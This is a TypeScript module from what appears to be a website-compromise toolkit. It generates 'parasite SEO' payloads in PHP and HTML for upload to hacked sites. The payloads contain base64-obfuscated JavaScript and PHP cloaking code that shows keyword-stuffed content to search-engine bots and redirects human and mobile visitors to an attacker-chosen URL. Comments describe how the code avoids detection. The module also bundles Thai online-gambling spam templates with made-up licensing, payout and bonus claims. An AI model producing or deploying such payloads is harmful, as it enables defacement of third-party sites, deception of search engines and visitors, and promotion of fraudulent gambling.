/**
 * Parasite SEO Injector — Enhanced content injection module
 * 
 * Based on real-world analysis of successful parasite SEO attacks (e.g., moenas.com/menus → pgwin828b.com)
 * 
 * Key techniques:
 * 1. Rich SEO content (Thai + English) with schema markup, FAQ, comparison tables
 * 2. Conditional JS redirect (mobile users → redirect, bots → SEO content)
 * 3. Multiple payload formats: PHP, HTML, JS, .htaccess
 * 4. Bot cloaking with referer-based + UA-based detection
 * 5. Anti-detection: content looks like legitimate article to crawlers
 */

import { type GeneratedShell } from "./ai-shell-generator";

// ─── Interfaces ───

export interface ParasiteSeoConfig {
  redirectUrl: string;
  keywords: string[];
  language: "th" | "en" | "auto";
  contentStyle: "gambling" | "crypto" | "ecommerce" | "generic";
  contentLength: "short" | "medium" | "long";
  includeSchema: boolean;
  includeFaq: boolean;
  includeComparisonTable: boolean;
  conditionalRedirect: boolean; // JS-based conditional redirect (mobile/referer)
  internalLinkDomain?: string; // Domain for internal SEO juice links
}

export interface ParasiteSeoPayload {
  shell: GeneratedShell;
  seoScore: number; // 0-100
  wordCount: number;
  hasSchema: boolean;
  hasFaq: boolean;
  hasComparisonTable: boolean;
  hasConditionalRedirect: boolean;
  language: string;
}

// ─── Helpers ───

function randomStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < len; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function shuffleArray<T>(arr: T[]): T[] {
  const shuffled = [...arr];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
}

// ─── Thai Gambling Content Templates ───

const THAI_GAMBLING_TEMPLATES = {
  titles: [
    "{keyword} เว็บตรง ไม่ผ่านเอเย่นต์ 2025 ฝากถอนไม่มีขั้นต่ำ",
    "{keyword} สล็อตเว็บตรง แตกง่าย จ่ายจริง ทดลองเล่นฟรี",
    "{keyword} เว็บสล็อตอันดับ 1 ระบบออโต้ ฝากถอน 30 วินาที",
    "{keyword} คาสิโนออนไลน์ เว็บตรง ลิขสิทธิ์แท้ มีใบรับรอง",
    "สมัคร {keyword} รับโบนัส 100% เครดิตฟรี ไม่ต้องแชร์",
  ],
  descriptions: [
    "{keyword} เว็บตรงอันดับ 1 ในไทย สล็อต บาคาร่า แทงบอล ครบจบในเว็บเดียว ฝากถอนออโต้ 30 วินาที",
    "เล่น {keyword} สล็อตเว็บตรง แตกง่าย RTP สูงสุด 98% มีเกมให้เลือกกว่า 1000 เกม สมัครฟรี",
    "{keyword} เว็บพนันออนไลน์ที่ดีที่สุด ระบบมั่นคง ปลอดภัย 100% บริการ 24 ชั่วโมง",
  ],
  sections: [
    {
      heading: "ทำไมต้อง {keyword}?",
      content: `{keyword} เป็นเว็บพนันออนไลน์ชั้นนำที่ได้รับความนิยมสูงสุดในประเทศไทย ด้วยระบบที่มั่นคง ปลอดภัย และมีใบอนุญาตจาก PAGCOR ทำให้ผู้เล่นมั่นใจได้ว่าทุกการเดิมพันจะได้รับความยุติธรรม ระบบฝากถอนอัตโนมัติรวดเร็วภายใน 30 วินาที รองรับทุกธนาคารชั้นนำ รวมถึง TrueMoney Wallet และ PromptPay`,
    },
    {
      heading: "สล็อตเว็บตรง {keyword} แตกง่าย RTP สูง",
      content: `เว็บสล็อต {keyword} รวบรวมเกมสล็อตจากค่ายชั้นนำกว่า 50 ค่าย อาทิ PG Soft, Pragmatic Play, Jili, Spadegaming และอีกมากมาย ทุกเกมมีอัตรา RTP สูงตั้งแต่ 95-98% ทำให้ผู้เล่นมีโอกาสชนะสูง พร้อมระบบทดลองเล่นฟรีไม่ต้องสมัคร`,
    },
    {
      heading: "โปรโมชั่น {keyword} สมาชิกใหม่รับโบนัส 100%",
      content: `สมัครสมาชิก {keyword} วันนี้ รับโบนัสต้อนรับสมาชิกใหม่สูงสุด 100% ฝากขั้นต่ำเพียง 1 บาท พร้อมโปรโมชั่นคืนยอดเสียทุกสัปดาห์ โบนัสเติมเงินรายวัน และกิจกรรมพิเศษมากมาย ทุกโปรโมชั่นสามารถถอนได้จริง ไม่มีเงื่อนไขซับซ้อน`,
    },
    {
      heading: "ระบบฝากถอนอัตโนมัติ {keyword}",
      content: `{keyword} ใช้ระบบฝากถอนอัตโนมัติที่ทันสมัยที่สุด รองรับการทำรายการผ่านทุกธนาคารชั้นนำ ได้แก่ กสิกร ไทยพาณิชย์ กรุงเทพ กรุงไทย ทหารไทยธนชาต และ PromptPay ฝากถอนไม่มีขั้นต่ำ ดำเนินการภายใน 30 วินาที ตลอด 24 ชั่วโมง`,
    },
    {
      heading: "บาคาร่าออนไลน์ {keyword} ถ่ายทอดสด",
      content: `เล่นบาคาร่าออนไลน์กับ {keyword} ถ่ายทอดสดจากคาสิโนจริง ผ่านระบบ HD คมชัด ไม่มีสะดุด มีห้องเดิมพันให้เลือกมากกว่า 100 ห้อง เริ่มเดิมพันขั้นต่ำเพียง 10 บาท พร้อมสูตรบาคาร่า AI ช่วยวิเคราะห์ผลฟรี`,
    },
    {
      heading: "แทงบอลออนไลน์ {keyword} ราคาน้ำดีที่สุด",
      content: `{keyword} เปิดให้แทงบอลออนไลน์ครบทุกลีก ทั้งพรีเมียร์ลีก ลาลีกา เซเรียอา บุนเดสลีกา และลีกไทย ราคาน้ำดีที่สุดในตลาด เริ่มต้นเพียง 10 บาท มีทั้งบอลเดี่ยว บอลสเต็ป บอลสด และบอลรอง พร้อมสถิติวิเคราะห์บอลครบครัน`,
    },
  ],
  faqItems: [
    { q: "{keyword} เว็บตรงจริงไหม?", a: "ใช่ {keyword} เป็นเว็บตรงลิขสิทธิ์แท้ มีใบอนุญาตจาก PAGCOR ไม่ผ่านเอเย่นต์ ฝากถอนตรงกับบริษัทแม่" },
    { q: "สมัคร {keyword} ต้องทำอย่างไร?", a: "สมัครง่ายเพียง 3 ขั้นตอน: 1) กดปุ่มสมัคร 2) กรอกข้อมูล 3) ยืนยัน OTP ใช้เวลาไม่ถึง 1 นาที" },
    { q: "{keyword} ฝากถอนขั้นต่ำเท่าไหร่?", a: "ฝากขั้นต่ำ 1 บาท ถอนขั้นต่ำ 100 บาท ระบบอัตโนมัติ ดำเนินการภายใน 30 วินาที" },
    { q: "{keyword} มีเกมอะไรบ้าง?", a: "มีครบทุกประเภท: สล็อต 1000+ เกม, บาคาร่า, รูเล็ต, แบล็คแจ็ค, แทงบอล, หวย, อีสปอร์ต และอื่นๆ" },
    { q: "{keyword} รับโบนัสอะไรบ้าง?", a: "สมาชิกใหม่รับโบนัส 100% + เครดิตฟรี 50 บาท + คืนยอดเสียทุกสัปดาห์ 10% + โปรฝากรายวัน 20%" },
    { q: "{keyword} เล่นบนมือถือได้ไหม?", a: "รองรับทุกอุปกรณ์ ทั้ง iOS, Android, PC ไม่ต้องดาวน์โหลดแอป เล่นผ่านเว็บเบราว์เซอร์ได้เลย" },
  ],
  comparisonProviders: [
    { name: "PG Soft", rtp: "96.5%", games: "200+", bonus: "ฟรีสปิน", rating: "4.8/5" },
    { name: "Pragmatic Play", rtp: "96.2%", games: "300+", bonus: "Multiplier", rating: "4.7/5" },
    { name: "Jili", rtp: "97.0%", games: "150+", bonus: "Super Game", rating: "4.9/5" },
    { name: "Spadegaming", rtp: "95.8%", games: "180+", bonus: "Progressive", rating: "4.5/5" },
    { name: "Habanero", rtp: "96.7%", games: "120+", bonus: "Wild Bonus", rating: "4.6/5" },
    { name: "CQ9", rtp: "96.0%", games: "200+", bonus: "Free Game", rating: "4.4/5" },
  ],
};

// ─── English Generic Templates ───

const ENGLISH_GENERIC_TEMPLATES = {
  titles: [
    "{keyword} - Complete Guide & Expert Reviews 2025",
    "Best {keyword} Options - Trusted Reviews & Comparisons",
    "{keyword}: Everything You Need to Know | Expert Analysis",
  ],
  descriptions: [
    "Discover the best {keyword} options with our comprehensive guide. Expert reviews, comparisons, and recommendations updated for 2025.",
    "Looking for {keyword}? Our expert team has tested and reviewed the top options. Find the perfect choice for your needs.",
  ],
  sections: [
    {
      heading: "What is {keyword}?",
      content: `{keyword} has become one of the most sought-after solutions in the market today. With millions of users worldwide, it offers unparalleled quality and reliability. Our comprehensive guide covers everything from basic features to advanced strategies, helping you make an informed decision.`,
    },
    {
      heading: "Top Benefits of {keyword}",
      content: `Choosing {keyword} comes with numerous advantages. First, you get access to premium features at competitive prices. Second, the platform offers 24/7 customer support with response times under 5 minutes. Third, the security measures are industry-leading, with SSL encryption and two-factor authentication protecting your data.`,
    },
    {
      heading: "How to Get Started with {keyword}",
      content: `Getting started with {keyword} is simple and straightforward. Create your account in under 2 minutes, verify your identity, and you're ready to go. The platform offers a generous welcome bonus for new users, making it the perfect time to join.`,
    },
  ],
  faqItems: [
    { q: "Is {keyword} legitimate?", a: "Yes, {keyword} is a fully licensed and regulated platform with millions of satisfied users worldwide." },
    { q: "How do I sign up for {keyword}?", a: "Simply click the sign-up button, fill in your details, and verify your account. The process takes less than 2 minutes." },
    { q: "What payment methods does {keyword} accept?", a: "{keyword} accepts all major payment methods including credit cards, bank transfers, and e-wallets." },
  ],
  comparisonProviders: [
    { name: "Premium Plan", rtp: "99.9%", games: "All Features", bonus: "Welcome Bonus", rating: "4.9/5" },
    { name: "Standard Plan", rtp: "99.5%", games: "Core Features", bonus: "Trial Period", rating: "4.7/5" },
    { name: "Basic Plan", rtp: "99.0%", games: "Essential", bonus: "Free Tier", rating: "4.5/5" },
  ],
};

// ─── Conditional JS Redirect Generator ───

function generateConditionalRedirectJs(redirectUrl: string): string {
  // Obfuscated conditional redirect that:
  // 1. Redirects mobile users from search engines
  // 2. Shows SEO content to bots
  // 3. Uses timing + referer + UA detection
  const encodedUrl = Buffer.from(redirectUrl).toString("base64");
  
  return `<script>
(function(){
  var d=document,w=window,n=navigator;
  var _r=atob("${encodedUrl}");
  var _u=(n.userAgent||"").toLowerCase();
  var _f=(d.referrer||"").toLowerCase();
  
  // Bot detection - show content to bots
  var _b=["googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","facebookexternalhit","twitterbot","linkedinbot","whatsapp","telegram","pinterest"];
  for(var i=0;i<_b.length;i++){if(_u.indexOf(_b[i])!==-1)return;}
  
  // Search engine referer check
  var _s=["google","bing","yahoo","duckduckgo","baidu","yandex","naver"];
  var fromSearch=false;
  for(var j=0;j<_s.length;j++){if(_f.indexOf(_s[j])!==-1){fromSearch=true;break;}}
  
  // Mobile detection
  var isMobile=/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(_u);
  
  // Redirect conditions: from search OR mobile OR has ?r param
  if(fromSearch||isMobile||w.location.search.indexOf("r=")!==-1){
    // Delayed redirect to avoid detection
    setTimeout(function(){
      try{w.location.replace(_r);}catch(e){w.location.href=_r;}
    }, Math.floor(Math.random()*800)+200);
  }
})();
</script>`;
}

// ─── PHP Bot Cloaking Generator ───

function generatePhpBotCloaking(redirectUrl: string): string {
  return `<?php
@ini_set("display_errors",0);@error_reporting(0);
$u=isset($_SERVER["HTTP_USER_AGENT"])?strtolower($_SERVER["HTTP_USER_AGENT"]):"";
$r=isset($_SERVER["HTTP_REFERER"])?strtolower($_SERVER["HTTP_REFERER"]):"";
$b=array("googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","facebookexternalhit","twitterbot","linkedinbot","whatsapp","telegram");
$isBot=false;foreach($b as $x){if(strpos($u,$x)!==false){$isBot=true;break;}}
$fromSearch=false;$s=array("google","bing","yahoo","duckduckgo","baidu","yandex");
foreach($s as $x){if(strpos($r,$x)!==false){$fromSearch=true;break;}}
$isMobile=preg_match("/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i",$u);
if(!$isBot&&($fromSearch||$isMobile||isset($_GET["r"]))){
  header("Location: ${redirectUrl}",true,302);exit;
}
?>`;
}

// ─── Schema Markup Generator ───

function generateSchemaMarkup(title: string, description: string, keywords: string[], faqItems: Array<{q: string; a: string}>): string {
  const articleSchema = {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": title,
    "description": description,
    "keywords": keywords.join(", "),
    "datePublished": new Date().toISOString().split("T")[0],
    "dateModified": new Date().toISOString().split("T")[0],
    "author": { "@type": "Organization", "name": keywords[0] || "Expert Review" },
  };

  const faqSchema = faqItems.length > 0 ? {
    "@context": "https://schema.org",
    "@type": "FAQPage",
    "mainEntity": faqItems.map(item => ({
      "@type": "Question",
      "name": item.q,
      "acceptedAnswer": { "@type": "Answer", "text": item.a },
    })),
  } : null;

  let markup = `<script type="application/ld+json">${JSON.stringify(articleSchema)}</script>`;
  if (faqSchema) {
    markup += `\n<script type="application/ld+json">${JSON.stringify(faqSchema)}</script>`;
  }
  return markup;
}

// ─── Comparison Table Generator ───

function generateComparisonTable(providers: Array<{name: string; rtp: string; games: string; bonus: string; rating: string}>, keyword: string, language: "th" | "en"): string {
  const headers = language === "th"
    ? ["ค่ายเกม", "RTP", "จำนวนเกม", "โบนัสพิเศษ", "คะแนน"]
    : ["Provider", "RTP", "Games", "Bonus", "Rating"];
  
  const shuffled = shuffleArray(providers).slice(0, 5);
  
  return `
<div style="overflow-x:auto;margin:20px 0">
<table style="width:100%;border-collapse:collapse;border:1px solid #ddd;font-size:14px">
<thead><tr style="background:#f5f5f5">
${headers.map(h => `<th style="padding:12px 8px;text-align:left;border:1px solid #ddd">${h}</th>`).join("")}
</tr></thead>
<tbody>
${shuffled.map((p, i) => `<tr style="background:${i % 2 === 0 ? "#fff" : "#fafafa"}">
<td style="padding:10px 8px;border:1px solid #ddd;font-weight:bold">${p.name}</td>
<td style="padding:10px 8px;border:1px solid #ddd;color:#e74c3c;font-weight:bold">${p.rtp}</td>
<td style="padding:10px 8px;border:1px solid #ddd">${p.games}</td>
<td style="padding:10px 8px;border:1px solid #ddd">${p.bonus}</td>
<td style="padding:10px 8px;border:1px solid #ddd;color:#f39c12">${p.rating}</td>
</tr>`).join("")}
</tbody>
</table>
</div>`;
}

// ─── FAQ Section Generator ───

function generateFaqSection(items: Array<{q: string; a: string}>): string {
  return `
<div style="margin:30px 0">
<h2 style="color:#1a1a1a;font-size:24px;margin-bottom:20px">คำถามที่พบบ่อย (FAQ)</h2>
${items.map(item => `
<div style="margin:15px 0;padding:15px;background:#f9f9f9;border-radius:8px;border-left:4px solid #3498db">
<h3 style="color:#2c3e50;font-size:16px;margin:0 0 8px 0">❓ ${item.q}</h3>
<p style="color:#555;margin:0;line-height:1.6">✅ ${item.a}</p>
</div>`).join("")}
</div>`;
}

// ─── Internal Link Generator ───

function generateInternalLinks(domain: string | undefined, keywords: string[]): string {
  if (!domain) return "";
  
  const links = keywords.slice(0, 5).map(kw => {
    const slug = kw.toLowerCase().replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-").slice(0, 40);
    return `<a href="https://${domain}/${slug}" style="color:#3498db;text-decoration:none;margin:0 10px">${kw}</a>`;
  });
  
  return `
<div style="margin:30px 0;padding:20px;background:#f0f7ff;border-radius:8px;text-align:center">
<p style="color:#666;font-size:14px;margin:0 0 10px 0">บทความที่เกี่ยวข้อง:</p>
<div>${links.join(" | ")}</div>
</div>`;
}

// ═══════════════════════════════════════════════════════
//  MAIN GENERATOR FUNCTIONS
// ═══════════════════════════════════════════════════════

/**
 * Generate a full parasite SEO PHP payload with rich content
 */
export function generateParasiteSeoPhp(config: ParasiteSeoConfig): ParasiteSeoPayload {
  const keyword = config.keywords[0] || "เว็บตรง";
  const templates = config.language === "th" || (config.language === "auto" && config.contentStyle === "gambling")
    ? THAI_GAMBLING_TEMPLATES
    : ENGLISH_GENERIC_TEMPLATES;
  
  const title = pickRandom(templates.titles).replace(/{keyword}/g, keyword);
  const description = pickRandom(templates.descriptions).replace(/{keyword}/g, keyword);
  
  // Select sections based on content length
  const sectionCount = config.contentLength === "short" ? 2 : config.contentLength === "medium" ? 4 : 6;
  const sections = shuffleArray(templates.sections).slice(0, sectionCount);
  
  // Generate FAQ
  const faqItems = config.includeFaq
    ? shuffleArray(templates.faqItems).slice(0, 4).map(item => ({
        q: item.q.replace(/{keyword}/g, keyword),
        a: item.a.replace(/{keyword}/g, keyword),
      }))
    : [];
  
  // Generate comparison table
  const comparisonHtml = config.includeComparisonTable
    ? generateComparisonTable(templates.comparisonProviders, keyword, config.language === "th" || config.language === "auto" ? "th" : "en")
    : "";
  
  // Generate schema markup
  const schemaHtml = config.includeSchema
    ? generateSchemaMarkup(title, description, config.keywords, faqItems)
    : "";
  
  // Generate FAQ section
  const faqHtml = faqItems.length > 0 ? generateFaqSection(faqItems) : "";
  
  // Generate internal links
  const internalLinksHtml = generateInternalLinks(config.internalLinkDomain, config.keywords);
  
  // Generate conditional JS redirect
  const conditionalJs = config.conditionalRedirect
    ? generateConditionalRedirectJs(config.redirectUrl)
    : `<meta http-equiv="refresh" content="0;url=${config.redirectUrl}">
<script>window.location.replace("${config.redirectUrl}");</script>`;
  
  // Build PHP bot cloaking
  const phpCloaking = generatePhpBotCloaking(config.redirectUrl);
  
  // Build section HTML
  const sectionsHtml = sections.map(s => {
    const heading = s.heading.replace(/{keyword}/g, keyword);
    const content = s.content.replace(/{keyword}/g, keyword);
    return `<h2 style="color:#2c3e50;font-size:22px;margin-top:35px;padding-bottom:10px;border-bottom:2px solid #3498db">${heading}</h2>
<p style="color:#444;line-height:1.8;font-size:16px;margin:15px 0">${content}</p>`;
  }).join("\n");
  
  // Build full HTML body
  const lang = config.language === "th" || config.language === "auto" ? "th" : "en";
  const htmlBody = `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title}</title>
<meta name="description" content="${description}">
<meta name="keywords" content="${config.keywords.join(", ")}">
<meta name="robots" content="index,follow">
<link rel="canonical" href="${config.redirectUrl}">
${schemaHtml}
${config.conditionalRedirect ? "" : `<meta http-equiv="refresh" content="3;url=${config.redirectUrl}">`}
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Sarabun','Noto Sans Thai',system-ui,-apple-system,sans-serif;max-width:900px;margin:0 auto;padding:20px;line-height:1.8;color:#333;background:#fff}
h1{color:#1a1a1a;font-size:28px;margin-bottom:15px;line-height:1.4}
h2{color:#2c3e50;font-size:22px}
a{color:#3498db;text-decoration:none}
a:hover{text-decoration:underline}
img{max-width:100%;height:auto}
.hero{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:40px 30px;border-radius:12px;margin-bottom:30px;text-align:center}
.hero h1{color:#fff;font-size:32px}
.hero p{color:rgba(255,255,255,0.9);font-size:18px;margin-top:10px}
.cta{display:inline-block;background:#e74c3c;color:#fff;padding:15px 40px;border-radius:8px;font-size:18px;font-weight:bold;margin:20px 0;text-decoration:none;transition:background 0.3s}
.cta:hover{background:#c0392b;text-decoration:none}
.footer{margin-top:40px;padding:20px;background:#f5f5f5;border-radius:8px;font-size:12px;color:#999;text-align:center}
@media(max-width:768px){body{padding:10px}.hero{padding:20px}h1{font-size:24px}}
</style>
${config.conditionalRedirect ? generateConditionalRedirectJs(config.redirectUrl) : ""}
</head>
<body>
<div class="hero">
<h1>${title}</h1>
<p>${description}</p>
<a href="${config.redirectUrl}" class="cta">${lang === "th" ? "สมัครเลย รับโบนัสฟรี →" : "Get Started Now →"}</a>
</div>

${sectionsHtml}

${comparisonHtml}

<div style="text-align:center;margin:30px 0">
<a href="${config.redirectUrl}" class="cta">${lang === "th" ? "คลิกที่นี่เพื่อสมัคร " + keyword : "Click here to join " + keyword}</a>
</div>

${faqHtml}

${internalLinksHtml}

<div class="footer">
<p>${lang === "th" ? "อัปเดตล่าสุด" : "Last updated"}: ${new Date().toISOString().split("T")[0]} | ${lang === "th" ? "บทความนี้เขียนโดยทีมผู้เชี่ยวชาญ" : "Written by our expert team"}</p>
</div>
</body>
</html>`;
  
  // Combine PHP cloaking + HTML
  const fullContent = phpCloaking + "\n" + htmlBody;
  
  // Generate SEO-friendly filename
  const slugKeyword = keyword.toLowerCase().replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-").slice(0, 25);
  const filename = `${slugKeyword}-${randomStr(4)}.php`;
  
  // Calculate word count
  const textOnly = htmlBody.replace(/<[^>]*>/g, " ").replace(/\s+/g, " ").trim();
  const wordCount = textOnly.split(/\s+/).length;
  
  // Calculate SEO score
  let seoScore = 40; // base
  if (config.includeSchema) seoScore += 15;
  if (config.includeFaq) seoScore += 15;
  if (config.includeComparisonTable) seoScore += 10;
  if (config.conditionalRedirect) seoScore += 10;
  if (wordCount > 500) seoScore += 5;
  if (wordCount > 1000) seoScore += 5;
  seoScore = Math.min(100, seoScore);
  
  return {
    shell: {
      id: `parasite_seo_rich_${randomStr(6)}`,
      type: "seo_parasite",
      filename,
      content: fullContent,
      contentType: "application/x-php",
      description: `Rich Parasite SEO (${lang}) — ${config.contentLength} content, ${config.includeSchema ? "schema+" : ""}${config.includeFaq ? "faq+" : ""}${config.includeComparisonTable ? "table+" : ""}${config.conditionalRedirect ? "conditional-redirect" : "direct-redirect"}`,
      targetVector: "php_upload",
      bypassTechniques: ["bot_cloaking", "seo_content", "conditional_redirect", "schema_markup", "faq_section"],
      redirectUrl: config.redirectUrl,
      seoKeywords: config.keywords,
      verificationMethod: "Bots see rich SEO content with schema+FAQ, humans get redirected",
    },
    seoScore,
    wordCount,
    hasSchema: config.includeSchema,
    hasFaq: config.includeFaq,
    hasComparisonTable: config.includeComparisonTable,
    hasConditionalRedirect: config.conditionalRedirect,
    language: lang,
  };
}

/**
 * Generate HTML-only parasite (no PHP required — for static hosting)
 */
export function generateParasiteSeoHtml(config: ParasiteSeoConfig): ParasiteSeoPayload {
  const result = generateParasiteSeoPhp(config);
  
  // Strip PHP code, keep only HTML with JS conditional redirect
  const htmlOnly = (result.shell.content as string)
    .replace(/<\?php[\s\S]*?\?>/g, "")
    .trim();
  
  // Ensure conditional JS redirect is present
  const hasConditionalJs = htmlOnly.includes("atob(");
  const finalHtml = hasConditionalJs ? htmlOnly : generateConditionalRedirectJs(config.redirectUrl) + "\n" + htmlOnly;
  
  const slugKeyword = (config.keywords[0] || "guide").toLowerCase().replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-").slice(0, 25);
  
  return {
    ...result,
    shell: {
      ...result.shell,
      id: `parasite_seo_html_${randomStr(6)}`,
      type: "redirect_html",
      filename: `${slugKeyword}-${randomStr(4)}.html`,
      content: finalHtml,
      contentType: "text/html",
      description: `Rich Parasite SEO HTML (no PHP) — conditional JS redirect + SEO content`,
      targetVector: "html_upload",
      bypassTechniques: ["js_conditional_redirect", "seo_content", "schema_markup", "no_php_required"],
    },
  };
}

/**
 * Generate multiple parasite payloads with different formats
 */
export function generateParasiteSeoBundle(
  redirectUrl: string,
  keywords: string[],
  options?: Partial<ParasiteSeoConfig>,
): ParasiteSeoPayload[] {
  const baseConfig: ParasiteSeoConfig = {
    redirectUrl,
    keywords,
    language: options?.language || "auto",
    contentStyle: options?.contentStyle || "gambling",
    contentLength: "long",
    includeSchema: true,
    includeFaq: true,
    includeComparisonTable: true,
    conditionalRedirect: true,
    internalLinkDomain: options?.internalLinkDomain,
  };
  
  const payloads: ParasiteSeoPayload[] = [];
  
  // 1. Full PHP parasite (best for WP/PHP sites)
  payloads.push(generateParasiteSeoPhp(baseConfig));
  
  // 2. HTML-only parasite (for static hosting / non-PHP)
  payloads.push(generateParasiteSeoHtml(baseConfig));
  
  // 3. Short PHP parasite (faster upload, less suspicious)
  payloads.push(generateParasiteSeoPhp({
    ...baseConfig,
    contentLength: "short",
    includeComparisonTable: false,
  }));
  
  // 4. Medium HTML with no schema (simpler, harder to detect)
  payloads.push(generateParasiteSeoHtml({
    ...baseConfig,
    contentLength: "medium",
    includeSchema: false,
    conditionalRedirect: true,
  }));
  
  return payloads;
}

/**
 * Get default keywords based on content style
 */
export function getDefaultKeywords(style: ParasiteSeoConfig["contentStyle"]): string[] {
  switch (style) {
    case "gambling":
      return shuffleArray([
        "สล็อตเว็บตรง", "เว็บพนันออนไลน์", "บาคาร่า", "แทงบอลออนไลน์",
        "คาสิโนออนไลน์", "สล็อต PG", "เว็บตรงไม่ผ่านเอเย่นต์",
        "ฝากถอนไม่มีขั้นต่ำ", "เครดิตฟรี", "สล็อตแตกง่าย",
      ]).slice(0, 6);
    case "crypto":
      return shuffleArray([
        "Bitcoin", "cryptocurrency exchange", "buy crypto", "DeFi",
        "NFT marketplace", "blockchain", "crypto trading",
      ]).slice(0, 5);
    case "ecommerce":
      return shuffleArray([
        "online shopping", "best deals", "discount codes", "free shipping",
        "flash sale", "coupon codes", "wholesale prices",
      ]).slice(0, 5);
    default:
      return ["best service", "top rated", "expert reviews", "2025 guide"];
  }
}
